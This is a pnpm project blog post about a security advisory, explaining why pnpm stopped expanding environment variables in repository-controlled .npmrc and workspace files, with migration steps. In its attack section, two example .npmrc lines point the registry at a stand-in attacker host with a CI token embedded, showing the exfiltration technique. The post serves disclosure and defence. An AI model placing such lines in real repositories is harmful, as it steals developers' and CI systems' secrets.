---
title: "Why pnpm no longer expands environment variables in a repository's .npmrc"
date: 2026-06-11
authors: zkochan
tags: [security]
---

pnpm used to expand `${ENV_VAR}` placeholders everywhere it found them — including in the `.npmrc` and `pnpm-workspace.yaml` files that live inside the repository you just cloned. That turned out to be a way for a malicious repository to steal the secrets in your environment. As of **v10.34.2** and **v11.5.3**, pnpm stops expanding environment variables in repository-controlled registry and credential settings.

This was a security fix ([GHSA-3qhv-2rgh-x77r](https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r)), and it is a breaking change for some setups. This post explains the attack, what exactly changed, and how to migrate.

<!--truncate-->

## The attack

A `.npmrc` committed to a repository is attacker-controlled the moment you clone the repo. Before this change, pnpm would expand environment variables in that file when resolving dependencies — *before* any lifecycle script ran, so even pnpm's script-blocking protections didn't help.

Consider a repository that ships this `.npmrc`:

```ini
registry=https://attacker.example/${CI_JOB_TOKEN}/
```

or this one:

```ini
registry=https://attacker.example/
//attacker.example/:_authToken=${CI_JOB_TOKEN}
```

When you ran `pnpm install` with `CI_JOB_TOKEN` (or any other guessable secret) present in your environment, pnpm expanded the placeholder and sent the secret straight to the attacker — either in the request URL (`https://attacker.example/<secret>/...`) or in an `Authorization: Bearer <secret>` header. The same trick worked through `registry` URLs in `pnpm-workspace.yaml`.

No install scripts, no `postinstall` — just resolving dependencies was enough to exfiltrate a token.

## What changed

pnpm now treats environment expansion as **trust-aware**. Environment variables are no longer expanded when the value comes from a repository-controlled file:

- In the project and workspace `.npmrc`: `registry`, `@scope:registry`, proxy URLs, URL-scoped keys (`//host/…`), and credential values (`_authToken`, `_auth`, `_password`, `username`, `tokenHelper`, `cert`, `key`).
- In `pnpm-workspace.yaml`: registry URLs (`registry`, and the values of `registries` / `namedRegistries`).

A setting that contains a `${...}` placeholder in one of these positions is ignored, and pnpm prints a warning explaining how to migrate it.

Environment variables are **still expanded** in config that doesn't come from the repository:

- your user-level `~/.npmrc` (and the file pointed to by [`npmrcAuthFile`](/settings#npmrcauthfile));
- the global configuration;
- command-line options;
- environment config.

That boundary is the whole point: a token belongs in a location *you* control, not one that ships with the code you're about to install. We also hardened a related edge case where a repository `.npmrc` could redirect which file pnpm treats as trusted user/global config (via `userconfig`, `globalconfig`, or `prefix`); those destinations are now resolved only from trusted sources.

## How to migrate

If your authentication broke after upgrading, move the token out of the committed `.npmrc` and into a trusted location.

**Write it to your user/global config** (this is what pnpm's own CI does):

```sh
pnpm config set "//registry.npmjs.org/:_authToken" "$NPM_TOKEN"
```

`pnpm config set` writes to your user/global config by default, never to the project `.npmrc`, so the token stays out of the repository.

**Or supply the credential entirely through an environment variable** — no `.npmrc` file at all (since v11.6). pnpm reads URL-scoped registry settings from `pnpm_config_//…` (and `npm_config_//…`) environment variables:

```sh
export "pnpm_config_//registry.npmjs.org/:_authToken=$NPM_TOKEN"
```

This is the most direct, file-free replacement for a committed `//registry.npmjs.org/:_authToken=${NPM_TOKEN}` line. Because the registry the credential applies to is encoded in the (trusted) variable name, a malicious repository can't redirect it to another host. The value overrides the project `.npmrc` but is itself overridden by a command-line option, and when the same key is set through both prefixes, `pnpm_config_` wins. (`tokenHelper` is intentionally never read from environment variables.)

**Or keep the `${NPM_TOKEN}` line in your user-level `~/.npmrc`** instead of the repository — environment variables are still expanded there.

**In GitHub Actions**, `actions/setup-node` with the `registry-url` input already writes a user-level `.npmrc`, so authenticating through `NODE_AUTH_TOKEN` keeps working with no further changes:

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: 24
    registry-url: https://registry.npmjs.org
- run: pnpm install
  env:
    NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

**On other CI systems** where editing every pipeline is impractical, you can declare the repository's own `.npmrc` trusted by setting one environment variable in the CI environment:

```sh
# v11:
PNPM_CONFIG_NPMRC_AUTH_FILE=.npmrc
# v10 (or as a fallback):
NPM_CONFIG_USERCONFIG=.npmrc
```

Because that trust declaration comes from the environment — not from the repository — a malicious repo can't set it for you. Only use it in environments that build trusted repositories: it disables the protection for that checkout entirely.

## Dynamic registry URLs

The same rule applies to registry and proxy URLs. If you used an environment variable to template a registry URL, move it to a trusted source (`pnpm config set`, your user `~/.npmrc`, a CLI option, or environment config). If the URL isn't secret, you can simply write the resolved value directly in the project `.npmrc` — only `${...}` placeholders are ignored, literal URLs are fine.

## Different tokens per scope

A common reason people reached for `${...}` placeholders was juggling several tokens for one registry host. As of **v11.7**, pnpm can select a different auth token per package **scope**, even when the scopes share the same registry URL — so you no longer need to template a single key with a variable. Put the scope after the registry URL in the auth key (in a trusted location, e.g. your user `~/.npmrc`):

```ini
@org-a:registry=https://npm.pkg.github.com/
@org-b:registry=https://npm.pkg.github.com/

//npm.pkg.github.com/:@org-a:_authToken=${ORG_A_TOKEN}
//npm.pkg.github.com/:@org-b:_authToken=${ORG_B_TOKEN}
```

Installing or publishing `@org-a/*` uses `ORG_A_TOKEN`; `@org-b/*` uses `ORG_B_TOKEN`. See [scope-specific auth tokens](/npmrc#scope-specific-auth-tokens).

## Sorry about the breakage

Shipping a breaking change in a patch release is not something we do lightly, and we know it disrupted some CI pipelines. But this was a reported vulnerability with a working exploit, and leaving it open — or waiting for the next major — would have meant knowingly shipping a way for any repository to read your secrets. Backporting the fix to v10 as a patch was the only way existing users would actually receive it.

For the full migration guide, see the [authentication settings documentation](/npmrc#environment-variables-in-auth-settings).
